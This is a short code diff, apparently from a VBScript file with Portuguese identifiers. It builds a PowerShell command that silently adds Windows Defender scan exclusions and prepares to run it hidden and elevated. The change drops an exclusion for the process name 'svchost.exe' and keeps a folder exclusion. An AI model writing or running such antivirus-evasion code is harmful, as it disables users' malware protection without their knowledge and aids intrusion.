@@ -134,8 +134,7 @@ On Error Goto 0
 
 If rc <> 0 Then
     psExclusao = "$p = '" & pastaDefender & "'; " & _
-                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " & _
-                 "Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
+                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue"
     psExclusao = Replace(psExclusao, "'", "''")
 
     cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
